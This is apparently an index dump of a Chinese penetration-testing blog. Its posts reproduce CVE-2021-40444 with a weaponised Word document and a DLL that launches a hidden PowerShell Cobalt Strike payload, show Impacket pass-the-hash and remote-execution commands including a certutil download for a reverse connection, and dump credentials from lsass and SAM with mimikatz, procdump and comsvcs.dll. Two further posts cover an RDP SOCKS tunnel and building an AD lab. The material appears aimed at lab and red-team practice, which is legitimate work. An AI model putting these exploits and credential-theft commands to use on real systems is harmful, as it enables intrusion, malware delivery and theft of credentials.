{"categories":[{"title":"SQL注入","uri":"https://ad-calcium.github.io/categories/sql%E6%B3%A8%E5%85%A5/"},{"title":"web安全","uri":"https://ad-calcium.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"title":"内网渗透","uri":"https://ad-calcium.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"title":"内网环境搭建","uri":"https://ad-calcium.github.io/categories/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"title":"凭据窃取","uri":"https://ad-calcium.github.io/categories/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/"},{"title":"小技巧","uri":"https://ad-calcium.github.io/categories/%E5%B0%8F%E6%8A%80%E5%B7%A7/"},{"title":"数据库","uri":"https://ad-calcium.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"title":"未授权漏洞","uri":"https://ad-calcium.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"},{"title":"横向移动","uri":"https://ad-calcium.github.io/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"title":"漏洞复现","uri":"https://ad-calcium.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"posts":[{"content":"0x01 漏洞描述 CVE-2021-40444：微软MSHTML引擎存在代码执行漏洞，攻击者通过精心制作包含恶意ActiveX的Offcie文档，诱导用户打开，从而实现远程代码执行。当用户主机启用了ActiveX控件，攻击者可通过该漏洞控制受害者主机。\n0x02 影响版本 全版本\n0x02 漏洞工具 poc下载地址\nhttps://github.com/lockedbyte/CVE-2021-40444\r 0x04 样本分析 样本下载\nhttps://bazaar.abuse.ch/sample/938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52/\r 下载样本，将docx改成zip，使用zip解压即可\n\\word\\_rels\\document.xml.rels\r 可以看出文件中引用了mhtml，然后Windows默认浏览器执行ActiveX最后造成代码执行。\n0x05 复现 1.弹计算器 安装lcab\napt-get install lcab\r 运行脚本生成word文档\npython3 exploit.py generate test/calc.dll http://\u0026lt;SRV IP\u0026gt;\r 运行脚本监听80端口，默认为srv目录\npython3 exploit.py host 80\r 打开word文档，即可弹出计算器\n弹计算器肯定是不够的，不如来上线个cs\n2.上线cs 先使用cs生成powershell\n将生成的powershell代码复制到下面\n#include \u0026quot;pch.h\u0026quot;\r#include \u0026quot;windows.h\u0026quot;\r#include \u0026lt;cstdlib\u0026gt;\rvoid exec(void) {\rsystem(\u0026quot;powershell -nop -w hidden -encodedcommand xxxxx\u0026quot;);\rreturn;\r}\rBOOL WINAPI DllMain(\rHINSTANCE hinstDLL,\rDWORD fdwReason,\rLPVOID lpReserved)\r{\rswitch (fdwReason)\r{\rcase DLL_PROCESS_ATTACH:\rexec();\rbreak;\rcase DLL_THREAD_ATTACH:\rbreak;\rcase DLL_THREAD_DETACH:\rbreak;\rcase DLL_PROCESS_DETACH:\rbreak;\r}\rreturn TRUE;\r}\r 使用vs2019编译dll\n将编译后的dll文件复制到test目录\n运行脚本生成word文档\npython3 exploit.py generate test/Dll1.dll http://10.108.3.157\r 监听80端口，点击启动编辑\npython3 exploit.py host 80  看到成功有访问记录\ncs成功上线\n参考地址\n","id":0,"section":"posts","summary":"0x01 漏洞描述 CVE-2021-40444：微软MSHTML引擎存在代码执行漏洞，攻击者通过精心制作包含恶意ActiveX的Offcie文档，诱","tags":["漏洞复现","钓鱼"],"title":"CVE-2021-40444 漏洞复现","uri":"https://ad-calcium.github.io/2021/09/cve-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","year":"2021"},{"content":"SocksOverRDP  项目地址：https://github.com/nccgroup/SocksOverRDP  SocksOverRDP 可以将 SOCKS 代理的功能添加到远程桌面服务，它使用动态虚拟通道，使我们能够通过开放的 RDP 连接进行通信，而无需在防火墙上打开新的套接字、连接或端口。此工具在 RDP 协议的基础上实现了 SOCKS 代理功能，就像 SSH 的 -D 参数一样，在建立远程连接后，即可利用 RDP 协议实现代理功能。\n该工具分为服务端和客户端\n 第一部分是一个 .dll 文件，需要在 RDP 连接的客户端上进行注册，并在每次运行时将其加载到远程桌面客户端 mstsc 的上下文运行环境中。 第二部分是一个 .exe 可执行文件，它是服务端组件，需要上传到 RDP 连接的服务器并执行。  工具原理：\n当 SocksOverRDP-Plugin.dll 在 RDP 客户端上被正确注册后，每次启动远程桌面时都会由 mstsc 加载。接着，当 SocksOverRDP-Server.exe 被上传到 RDP 服务端上传并执行后 ，SocksOverRDP-Server.exe 会在动态虚拟通道上回连 SocksOverRDP-Plugin.dll，这是远程桌面协议的一个功能。虚拟通道设置完成后，SOCKS 代理将在 RDP 客户端计算机上启动，默认为 127.0.0.1:1080。此服务可用作任何浏览器或工具的 SOCKS5 代理。并且服务器上的程序不需要服务器端的任何特殊特权，还允许低特权用户打开虚拟通道并通过连接进行代理。\n通过 SocksOverRDP 搭建 SOCKS5 代理 测试环境如下：\n客户端 在攻击中对 SocksOverRDP-Plugin.dll 进行安装注册\n\rregsvr32.exe SocksOverRDP-Plugin.dll # 注册\r# regsvr32.exe /u SocksOverRDP-Plugin.dll 取消注册\r 如上图所示，注册成功。但是由于 SocksOverRDP 建立的 SOCKS5 代理是默认监听在 127.0.0.1:1080 上的，所以只能从攻击机本地使用，为了让攻击者的 Kali 也能使用搭建在攻击机 Windows 10 上的 SOCKS5 代理，我们需要修改其注册表，将 IP 从 127.0.0.1 改为 0.0.0.0。注册表的位置为：\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\\AddIns\\SocksOverRDP-Plugin\r 可以下载源代码，将127.0.0.1改成0.0.0.0\n通过攻击机启动mstsc.exe，连接目标主机\n服务端 弹出了一个提示说 SocksOverRDP 成功启动，当服务端的可执行文件运行后即可在攻击机的 1080 端口上启动 SOCKS5 代理服务。\n在攻击机上，可以发现1080端口已经成功建立连接。\n使用Proxifier建立代理\n","id":1,"section":"posts","summary":"SocksOverRDP 项目地址：https://github.com/nccgroup/SocksOverRDP SocksOverRDP 可以将 SOCKS 代理的功能添加到远程桌面服务，它使用动","tags":["端口复用","内网渗透"],"title":"利用RDP协议搭建Socks5代理隧道","uri":"https://ad-calcium.github.io/2021/09/%E5%88%A9%E7%94%A8-rdp-%E5%8D%8F%E8%AE%AE%E6%90%AD%E5%BB%BA-socks5-%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93/","year":"2021"},{"content":"一、AD CS的功能  证书颁发机构（CA）：可以向用户、机构和服务颁发证书。 CA WEB注册：用户可以通过web浏览器申请证书。 联机响应程序服务：联机响应程序服务通过对特定证书的吊销状态申请进行解码，评估这些证书的状态，并发送回包含所申请证书状态信息的签名响应来实现联机证书状态协议 (OCSP)。 网络设备注册服务：网络设备注册服务可根据 Cisco Systems Inc. 提供的简单证书注册协议 (SCEP) 允许路由器和其他网络设备获取证书。  二、安装AD CS证书 在服务器管理器中 ，点击添加角色和功能，下一步\n 选基于角色或基于功能的安装，下一步\n选择要安装角色或功能的服务器，服务器池中只有本机，下一步\n选择要安装的角色，选中Active Directory 证书服务，添加功能\n选择角色对应的功能，默认即可，下一步\n安装证书服务，下一步\n安装角色服务\n确认安装\n 安装完成\n点击蓝色的配置目标服务器…\n点击”配置目标服务器上的Active Directory证书服务”，出现配置向导窗口\n配置角色服务\n指定CA的设置类型\n指定私钥类型指定私钥类型\n指定加密选项\n指定CA名称\n指定有效期\n指定CA数据库位置\n进行确认和配置\n配置证书模板\n激活证书服务\n激活证书服务\nhttps://127.0.0.1/certsrv 输入域用户名密码\n","id":2,"section":"posts","summary":"一、AD CS的功能 证书颁发机构（CA）：可以向用户、机构和服务颁发证书。 CA WEB注册：用户可以通过web浏览器申请证书。 联机响应程序服务：联","tags":["内网环境搭建"],"title":"Windows server 2012 AD CA证书服务搭建","uri":"https://ad-calcium.github.io/2021/09/windows-server-2012-ad-ca%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/","year":"2021"},{"content":"1. 安装域控 一、准备工作 首先准备1台比较干净的服务器，推荐使用 Windows Server 2012 R2，使用别的服务器可能会出现问题。\n二、修改主机名 三、安装域 打开服务器管理器，添加角色和功能。\n出现“添加角色和功能”界面，下一步 。\n根据提示操作，下一步。\n根据提示操作，下一步。\n选择添加AD域服务（Active Directory 域服务），同时添加所需功能。\n根据提示操作，下一步\n根据提示操作，下一步\n根据提示操作，安装\n等待安装完成\n安装完成\n四、配置域 点击服务器管理器左侧“AD DS” 、点击黄色提示部分中的更多。\n进入AD域服务器配置向导，选择 “添加新林” ，输入域，点击下一步。\n填写密码，下一步 。\n提示DNS无法创建，不用管，继续下一步\n根据提示操作，下一步\n安装路径，默认，下一步\n查看选项，默认，下一步\n点击安装 。此过程可能会报错，提示登陆用户没有设置密码，去设置给当前登陆用户（Administrator）设置一个密码，然后回来点击 “重新运行先决条件检查” 即可！\n安装完成，会提示注销重启 （此过程比较漫长，耐心等待）\n2. 辅域控制器的安装方法 一、准备工作 在DC中处新建一个用户和安全组，针对安全组来设置权限（SecurityGroup），在之后的操作中都使用该用来来操作\n添加相应角色\n在DC2中设置DNS，首选 DNS 指向第一台域控，备用填写自己的 IP\n二、修改主机名 三、安装域 打开服务器管理器，添加角色和功能。\n出现“添加角色和功能”界面，下一步 。\n根据提示操作，下一步。\n根据提示操作，下一步。\n选择添加AD域服务（Active Directory 域服务），同时添加所需功能。\n根据提示操作，下一步\n根据提示操作，下一步\n根据提示操作，安装\n等待安装完成\n安装完成\n四、配置辅域 按照下图选择\n填写刚才新建具有权限的用户，不使用默认的administrator\n选择域，确定\n完成域确认后，下一步\n保持默认，填写还原模式密码\n下一步\n选择dc01（由于测试环境，没有任何数据，此处不需要“从介质安装”，多站点，数据库文件大时，使用该项）\n默认路径，下一步\n下一步\n安装\n安装完成后，重启\n登录\n安装后用户和计算机、站点和服务中，都看到了二台域控制器。\n到些主辅二台域控制器搭建完成\n","id":3,"section":"posts","summary":"1. 安装域控 一、准备工作 首先准备1台比较干净的服务器，推荐使用 Windows Server 2012 R2，使用别的服务器可能会出现问题。 二、修改主机名 三、安装域 打开服务器管理","tags":["内网环境搭建"],"title":"Windows Server 2012 R2安装域控制器和辅域","uri":"https://ad-calcium.github.io/2021/09/windows-server-2012-r2%E5%AE%89%E8%A3%85%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%92%8C%E8%BE%85%E5%9F%9F/","year":"2021"},{"content":"0x00 前言 Impacket官方介绍为用于处理网络协议的Python类的集合，该集合包含了渗透测试中常见的工具种类，包括远程命令执行、信息收集、票据传递、凭据获取、中间人攻击测试等。该套件里的工具使用也是linux主机跳向windows主机的方式之一。\n0x01 介绍 Impacket中包含以下协议  以太网，Linux“ Cooked”捕获。 IP，TCP，UDP，ICMP，IGMP，ARP。 IPv4和IPv6支持。 NMB和SMB1，SMB2和SMB3（高级实现）。 MSRPC版本5，通过不同的传输方式：TCP，SMB / TCP，SMB / NetBIOS和HTTP。 使用密码/哈希/票证/密钥的普通，NTLM和Kerberos身份验证。 以下MSRPC接口的部分/完全实现：EPM，DTYPE，LSAD，LSAT，NRPC，RRP，SAMR，SRVS，WKST，SCMR，DCOM，WMI TDS（MSSQL）和LDAP协议实现的部分。  Impacket中包含以下工具 远程执行  psexec.py：使用RemComSvc的PSEXEC类似功能示例。 smbexec.py：一种与使用RemComSvc的PSEXEC。我们的实现更进一步，实例化一个本地smbserver来接收命令的输出。这在目标计算机没有可用的可写共享的情况下很有用。 atexec.py：此示例通过Task Scheduler服务在目标计算机上执行命令，并返回已执行命令的输出。 wmiexec.py：半交互式外壳，通过Windows Management Instrumentation使用。不需要在目标服务器上安装任何服务/代理。以管理员身份运行。高度隐秘。（可使用NTLM_hash登录） dcomexec.py：与wmiexec.py类似的半交互外壳，但使用不同的DCOM端点。当前支持MMC20.Application，ShellWindows和ShellBrowserWindow对象。  Kerberos  GetTGT.py：给定密码，哈希或aesKey，此脚本将请求TGT并将其保存为ccache。 GetST.py：在ccache中输入密码，哈希，aesKey或TGT后，此脚本将请求服务票证并将其另存为ccache。如果该帐户具有受约束的委派（具有协议转换）权限，则可以使用-impersonate开关代表另一个用户请求票证。 GetPac.py：该脚本将仅具有经过身份验证的普通用户凭据，获取指定目标用户的PAC（特权属性证书）结构。通过混合使用MS-SFU]的S4USelf +用户到用户Kerberos身份验证来实现。 GetUserSPNs.py：此示例将尝试查找和获取与普通用户帐户关联的服务主体名称。输出与JtR和HashCat兼容。 GetNPUsers.py：此示例将尝试为那些设置了属性“不需要Kerberos预身份验证”（UF_DONT_REQUIRE_PREAUTH）的用户列出并获取TGT。输出与JtR兼容。 ticketer.py：此脚本将从头开始或基于模板（从KDC合法请求）创建Golden / Silver票证，允许您自定义PAC_LOGON_INFO结构内设置的某些参数，尤其是组，ExtraSid，持续时间等。 raiseChild.py：该脚本通过（ab）使用Golden Tickets和ExtraSids的概念来实现子域到森林特权的升级。  Windows的秘诀  secretsdump.py：执行各种技术以从远程计算机中转储秘密，而无需在该计算机上执行任何代理。对于SAM和LSA机密（包括缓存的凭据），我们尝试从注册表中读取尽可能多的内容，然后将配置单元保存在目标系统（％SYSTEMROOT％\\ Temp目录）中，并从那里读取其余数据。对于DIT文件，我们使用DL_DRSGetNCChanges（）方法转储NTLM哈希，纯文本凭据（如果可用）和Kerberos密钥。它还可以通过使用smbexec / wmiexec方法执行的vssadmin转储NTDS.dit。如果脚本不可用，该脚本将启动其工作所需的服务（例如，即使已禁用，也应使用“远程注册表”）。工作完成后，一切恢复到原始状态。 mimikatz.py：迷你外壳，用于控制由@gentilkiwi开发的远程mimikatz RPC服务器。  服务器工具/ MiTM攻击  ntlmrelayx.py：此脚本执行NTLM中继攻击，设置SMB和HTTP Server以及将凭据中继到许多不同的协议（SMB，HTTP，MSSQL，LDAP，IMAP，POP3等）。该脚本可以与预定义的攻击一起使用，这些预定义的攻击可以在中继连接时触发（例如，通过LDAP创建用户），或者可以以SOCKS模式执行。在这种模式下，对于每个中继的连接，以后可以通过SOCKS代理多次使用它。 karmaSMB.py：不管指定的SMB共享和路径名如何，均可响应karmaSMB.py)特定文件内容的SMB服务器。 smbserver.py：服务器的Python实现。允许快速设置共享和用户帐户。  WMI  wmiquery.py：它允许发出WQL查询并获得目标系统上WMI对象的描述（例如，从win32_account中选择名称）。 wmipersist.py：此脚本创建/删除WMI事件使用者/过滤器，并在两者之间建立链接，以基于指定的WQL过滤器或计时器执行Visual Basic。  已知漏洞  goldenPac.py：针对MS14-068的漏洞利用。保存黄金票，并在目标上启动PSEXEC会话。 sambaPipe.py：此脚本将利用CVE-2017-7494，上载并执行用户通过-so参数指定的共享库。 smbrelayx.py：使用SMB中继攻击来利用CVE-2015-0005。如果目标系统正在执行签名并且提供了计算机帐户，则模块将尝试通过NETLOGON收集SMB会话密钥。  SMB / MSRPC  smbclient.py：一个通用的SMB客户端，可让您使用用户名和密码或用户名和哈希值的组合列出共享和文件，重命名，上传和下载文件以及创建和删除目录。这是了解如何在实际中使用impacket.smb的绝佳示例。 getArch.py ：此脚本将连接到目标机器（或目标列表），并使用记录在案的MSRPC功能收集由（ab）安装的OS体系结构类型。 rpcdump.py：此脚本将转储在目标处注册的RPC终结点和字符串绑定的列表。它还将尝试将它们与知名端点列表匹配。 ifmap.py：此脚本将绑定到目标的MGMT接口以获取接口ID的列表。它将在野外看到的试图绑定到每个接口的另一个接口UUID列表的顶部使用该列表，并报告该接口是否已列出和/或正在侦听。 opdump.py：这绑定到给定的主机名：端口和MSRPC接口。然后，它尝试依次调用前256个操作号中的每个操作号，并报告每个调用的结果。 samrdump.py：一种与MSRPC套件中的“安全帐户管理器”远程接口进行通信的应用程序。它列出了系统用户帐户，可用资源份额以及通过此服务导出的其他敏感信息。 services.py：此脚本可用于通过MS-SCMR] MSRPC接口来操作Windows服务。它支持开始，停止，删除，状态，配置，列表，创建和更改。 netview.py：获取在远程主机上打开的会话的列表，并跟踪它们在找到的主机上循环，并跟踪谁从远程服务器登录/注销 reg.py：通过MS-RRP] MSRPC接口的远程注册表操作工具。这个想法是提供与REG.py Windows实用程序类似的功能。 lookupsid.py：通过MS-LSAT] MSRPC接口的Windows SID暴力实例，旨在查找远程用户/组。  MSSQL / TDS  mssqlinstance.py：从目标主机检索MSSQL实例名称。 mssqlclient.py：一个MSSQL客户端，支持SQL和Windows身份验证（也有哈希）。它还支持TLS。  档案格式  esentutl.py：一种Extensibe Storage Engine格式的实现。允许转储ESE数据库的目录，页面和表（例如NTDS.dit） ntfs-read.py：NTFS格式的实现。该脚本提供了一个迷你外壳，用于浏览和提取NTFS卷，包括隐藏/锁定的内容。 registry-read.py：一个Windwows注册表文件格式实现。它允许解析脱机注册表配置单元。  其他  GetADUsers.py：此脚本将收集有关域用户及其对应电子邮件地址的数据。它还将包含有关上次登录和上次密码设置属性的一些额外信息。 mqtt_check.py：简单的MQTT示例，旨在使用不同的登录选项。可以很容易地转换为帐户/密码蛮力。 rdp_check.py：MS-RDPBCGR和MS-CREDSSP]部分实现只是为了达到CredSSP身份验证。本示例测试帐户在目标主机上是否有效。 sniff.py：简单的数据包嗅探器，它使用pcapy库来侦听＃通过指定接口传输的数据包。 sniffer.py：简单的数据包嗅探器，它使用原始套接字侦听与指定协议相对应的传输中的数据包。 ping.py：使用ICMP回显和回显应答包检查主机状态的简单ICMP ping。如果远程主机已启动，则它应使用echo-r eply数据包回复echo探测。 ping6.py：使用ICMP回显和回显应答包检查主机状态的简单IPv6 ICMP ping。  0x02 基本使用 psexec psexec.py始于微软的pstools套件， 用于管理员远程管理windows主机资产，在渗透测试中也经常用来对远程计算机执行命令。\n与微软官方的psexec.py做对比，官方psexec.py执行远程命令会在远程主机创建一个PSEXEC的服务，并且命令执行后会一直存在，容易被管理人员发现并判断有入侵行为。impacket套件内的psexec，执行命令之后会删除对应的服务，隐蔽性更佳，而且impacket套件内的psexec支持PTH(哈希传递)。\n与官方psexec相同，impacket套件内的psexec也支持\u0026quot;-c\u0026quot;参数，参数解释如下，即复制本地可执行文件到远程主机并执行\n本地账号密码认证 python3 psexec.py ./administrator:123456@10.10.10.120\r 在psexec执行过程中，在远程主机10.10.10.120查看服务，发现创建了一个fZWPvIyH.py的服务\nNTLM HASH认证 python3 psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120\r 域管账号密码认证 python3 psexec.py adlab/administrator:123456@10.10.10.250\r 域内使用NTLM hash认证对远程主机 python3 psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 adlab/administrator@10.10.10.250\r 远程加载可执行程序 下面使用\u0026quot;-c\u0026quot;参数远程加载可执行程序，使目标主机反向回连。artifact.exe放到与psexec.py相同目录。\npython3 psexec.py ./administrator:123456@10.10.10.120 -c artifact.exe\r 如下图，目标主机已正常回连，由于目标主机是双网卡主机，显示内网ip为另外一块网卡的ip。\nsmbexe smbexe为全交互式工具，所以不可用于webshell环境，可用于rdp等有交互环境登录使用或socks代理环境下使用。\n本地账号密码认证 python3 smbexec.py ./administrator:123456@10.10.10.120\r NTLM hash认证 python3 smbexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120\r 域管账号密码认证 python3 smbexec.py adlab/administrator:123456@10.10.10.250\r 域内使用NTLM hash认证对远程主机 python3 smbexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 adlab/administrator@10.10.10.250\r smbclient.py 有时候，我们需要在攻击者计算机和目标计算机之间执行多项操作，那么 s mbclien.py 足够满足我们的所需，它可以列出共享和文件，重命名某些文 件，上传二进制文件或从目标计算机下载文件。\n句法： smbclient.py 域] / 用户]：密码/密码哈希] @ 目标 IP 地址]\n本地账号验证 python3 smbclient.py ./Administrator:123456@10.10.10.120\ruse c$\rput c:\\xxxx.exe 上传\rget xxx.exe c盘的相对路径，下载到当前文件夹内\r 成功上传到C盘\n下载\nNTLM HASH进行验证 python3 smbclient.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120\r 我们将连接到目标计算机，并且我们有了一个 smb shell，它可以运行各 种命令，例如 dir，cd，pwd，put，rename，更多，del，rm，mkdir，rmdir， 信息等\natexec atexec是通过windows计划任务执行远程命令，atexec是一个半交互的工具，即参数中添加需要在远程主机执行的命令，工具执行后即返回命令结果，适用于webshell下，也适用于其他网络环境。\n本地账号密码认证 python3 atexec.py ./administrator:123456@10.10.10.120 \u0026quot;whoami\u0026quot;\r NTLM hash认证 python3 atexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120 \u0026quot;whoami\u0026quot;\r 域管帐户密码认证 python3 atexec.py adlab/administrator:123456@10.10.10.120 \u0026quot;certutil -urlcache -split -f http://10x.xx.xx.x7:8080/lib8.py\u0026quot;  在linux主机下，使用proxychains代理工具，使用atexec远程执行该程序，使主机反向回连 *注意此处，123456密码中的\u0026quot;!\u0026ldquo;需要转义，否则会报错。*\nproxychains python3 atexec.py adlab/administrator:admin\\!@#45@10.10.10.120 \u0026quot;lib8.py\u0026quot;\r 域内使用NTLM hash认证对远程主机 python3 atexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 adlab/administrator@10.10.10.120 \u0026quot;whoami\u0026quot;\r 由此可以写一些简单bat脚本，如批量对内网机器遍历做hash传递验证、指定主机ntlm hash遍历验证、内网机器遍历做密码验证、指定主机密码遍历验证。\n内网机器遍历做hash传递验证,ips.txt内容为内网ip，每段一条 FOR /F %%i in (ips.txt) do atexec.py -hashes :DF92E298362E3E180EC0EE7226AFB821 ./administrator@%%i whoami 指定主机ntlm hash遍历验证，hashes.txt为已知ntlm hash内容，每段一条\rFOR /F %%i in (hashes.txt) do atexec.py -hashes %%i ./administrator@10.10.10.120 whoami 内网机器遍历做密码验证，passwords.txt为已知密码内容，每段一条\rFOR /F %%i in (passwords.txt) do atexec.py ./administrator:%%i@10.10.10.120 whoami 指定主机密码遍历验证,ips.txt内容为内网ip，每段一条\rFOR /F %%i in (ips.txt) do atexec.py ./administrator:password123@%%i whoami  wmiexec wmiexec是一个即有全交互也有半交互的远程命令执行工具，可运用于多种环境，包括webshell环境、rdp环境、socks环境等。\n本地账号密码认证 python3 wmiexec.py adlab/administrator:123456@10.10.10.120\r NTLM HASH认证 python3 wmiexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120\r 在linux主机下，使用proxychains代理工具，使用wmiexec对远程主机10.10.10.120执行命令\npython3 wmiexec.py adlab/administrator:admin\\!@#45@10.10.10.120\r dcomexec 此方式通过dcom远程管理组件来执行，此种方式走DCOM的135端口执行，445端口UNC取回。但如果目标445端口被防火墙过滤就会导致远程命令执行失败。\npython3 dcomexec.py ./administrator:123456@10.10.10.53\r 后续发现有一个参数叫-nooutput就可以解决这样的情况，这时wmiexec、dcomexec仅仅会使用135端口，但是不会有回显。有些时候很有必要把debug打开。\nSamrdump.py 与MSRPC套件中的安全帐户管理器远程接口通信的应用程序。它将为我们列出目标系统上的用户帐户，可用资源共享以及通过此服务导出的其他敏感信息\n语法: ./samrdump.py domain/] username : password] @] Target IP Address]\npython3 samrdump.py ./Administrator:123456@10.10.10.120\r getST 在ccache中输入密码，哈希，aesKey或TGT后，此脚本将请求服务票证并将其另存为ccache。如果该帐户具有受约束的委派（具有协议转换）权限，则可以使用-impersonate开关代表另一个用户请求票证。\npython3 getST.py -spn cifs/liming-pc.adlaboffice.com -impersonate administrator -dc-ip 192.168.10.50 adlaboffice.com/evilcomputer$:123456\r secretsdump 执行各种技术以从远程计算机中转储秘密，而无需在该计算机上执行任何代理。对于SAM和LSA机密（包括缓存的凭据），我们尝试从注册表中读取尽可能多的内容，然后将配置单元保存在目标系统（％SYSTEMROOT％\\ Temp目录）中，并从那里读取其余数据。对于DIT文件，我们使用DL_DRSGetNCChanges（）方法转储NTLM哈希，纯文本凭据（如果可用）和Kerberos密钥。它还可以通过使用smbexec / wmiexec方法执行的vssadmin转储NTDS.dit。如果脚本不可用，该脚本将启动其工作所需的服务（例如，即使已禁用，也应使用“远程注册表”）。工作完成后，一切恢复到原始状态。\npython3 secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL\r mssqlclient 一个MSSQL客户端，支持SQL和Windows身份验证（也有哈希）\nwindows认证 python3 mssqlclient.py ./administrator:123456@10.108.3.132 -windows-auth\r mssql账号密码认证的服务 python3 mssqlclient.py sa:123456@10.108.3.132\renable_xp_cmdshell 开启xpcmdshell\rxp_cmdshell whoami 执行命令\rupload c:\\shell.exe c:\\windows\\temp\\shell.exe\rupload 本地目录 远程目录\r 在windows环境下使用windows认证模式，使用ntlm hash验证方式，mssqlclient测试登录sqlserver服务器，账号验证成功后执行command.txt内的sql命令\npython3 mssqlclient.py -p 1433 -hashes :dsfhsajfdsjbfsdfrootkit/sqladmin@192.168.3.73 -file command.txt -windows-auth\r 验证成功后执行mssql.txt内的sql语句\npython3 mssqlclient.py domain/administrator@192.168.159.138 -windows-auth -file mssql.txt\r services.py Impacket 的服务脚本在 MSRPC Interface 的帮助下与 Windows 服务进行通 信。它可以启动，停止，删除，读取状态，配置，列出，创建和更改任何服务。\n句法： services.py 域] / 用户]：密码/密码哈希] @ 目标 IP 地址] 操 作]\n本地账号验证 python3 services.py Administrator:123456@10.10.10.120 list\r NTLM HASH进行验证 python3 services.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./Administrator@10.10.10.120 list\r opdump.py 该脚本绑定到给定的主机名：端口，并连接到 DCERPC（分布式计算环境/ 远程过程调用）接口。连接后，它将尝试依次调用前 256 个操作号中的每个操 作号，并报告每次调用的结果，这会生成与给定 host：port 的 TCP 连接信息。\n句法： opdump.py 目标 IP 地址] 端口接口版本]\npython3 opdump.py 10.10.10.120 135 76F226C3-EC14-4325-8A99- 6A46348418AF v1.0\r rpcdump.py RPC 或远程过程调用是指计算机程序使过程在不同的地址空间中执行时 （被编码为常规过程调用）。该脚本可以为我们枚举这些端点。\n句法： rpcdump.py 域] / 用户]：密码/密码哈希] @ 目标 IP 地址]\n本地账号验证 python3 rpcdump.py adlab/Administrator:123456@10.10.10.250\r NTLM HASH进行验证 python3 rpcdump.py -hashes :32196B56FFE6F45E294117B91A83BF38 adlab/Administrator@10.10.10.250\r lookupsid 安全标识符（SID）是可变长度的唯一值，用于标识用户帐户，通过 SID 用 户枚举，我们可以提取有关存在的用户及其数据的信息，Lookupsid 脚本可以 枚举本地和域用户。\n句法： lookupsid.py 域] / 用户]：密码/密码哈希] @ 目标 IP 地址]\n本地账号验证 python3 lookupsid.py adlab/Administrator:123456@10.10.10.250  NTLM HASH进行验证 python3 lookupsid.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 adlab/Administrator@10.10.10.250\r ","id":4,"section":"posts","summary":"0x00 前言 Impacket官方介绍为用于处理网络协议的Python类的集合，该集合包含了渗透测试中常见的工具种类，包括远程命令执行、信息收集、票","tags":["内网渗透","横向移动"],"title":"impacket套件使用","uri":"https://ad-calcium.github.io/2021/09/impacket%E5%A5%97%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/","year":"2021"},{"content":"0×00 前言 市面上可见到的读Windows本地密码的大多工具都是变则法子的去读lsass.exe这个密码的内存或者SAM数据库，然后从里面提取hash。所以有杀软的情况下读密码这事根本就不是工具免不免杀的问题，而是杀软有没有监控保护lsass.exe或SAM的问题，所以读本地密码条件可以总结为：\n 能正常访访问lsass.exe内存或SAM数据库。\n 0x02 工具下载地址 https://github.com/gentilkiwi/mimikatz/releases\r 0x3 实验 一、获取本地帐户密码 1.本地执行 右键以管理员方式运行cmd在当前终端中运行mimikatz.exe：\n#提升权限\rprivilege::debug\r#抓取密码\rsekurlsa::logonpasswords\r 当目标为 win10 或 2012R2 以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。\ncmd 修改注册表命令：\n#重启或用户重新登录后可以成功抓取\rreg add HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest /v UseLogonCredential /t REG\\_DWORD /d 1 /f\r 2.SAM 表获取 hash #导出SAM数据\rreg save hklm\\sam sam.hive\rreg save hklm\\system system.hive\r#使用mimikatz提取hash\rmimikatz.exe \u0026quot;lsadump::sam /sam:sam.hive /system:system.hive\u0026quot; exit\r 3.laZagne laZagne_x64.exe windows\r 二、lsass内存dump 通过以下操作可先获取到lsass内存文件，然后使用mimikatz可进一步读取密码\nmimikatz.exe \u0026quot;sekurlsa::minidump lsass.dmp\u0026quot; \u0026quot;sekurlsa::logonPasswords full\u0026quot; exit\r 1.procdump64 当 mimikatz 无法在主机上运行时，可以使用微软官方发布的工具 Procdump 导出 lsass.exe:\nprocdump64.exe -accepteula -ma lsass.exe lsass.dmp\r 2.createminidump createminidump.exe\r 3.SqlDumper for /f \u0026quot;tokens=2\u0026quot; %i in ('tasklist /FI \u0026quot;IMAGENAME eq lsass.exe\u0026quot; /NH') do Sqldumper.exe %i 0 0x01100\r 4.powershell for /f \u0026quot;tokens=2\u0026quot; %i in ('tasklist /FI \u0026quot;IMAGENAME eq lsass.exe\u0026quot; /NH') do powershell -c \u0026quot;rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump %i C:\\lsass.dmp full\u0026quot;\r 5.rdrleakdiag rdrleakdiag.exe转储的新方法\n默认存在的系统：\nWindows 10 Windows 8.1 Windows 8 Windows7 windows Vista 软件版本 10.0.15063.0 6.3.9600.17415 6.2.9200.16384 6.1.7600.16385 6.0.6001.18000 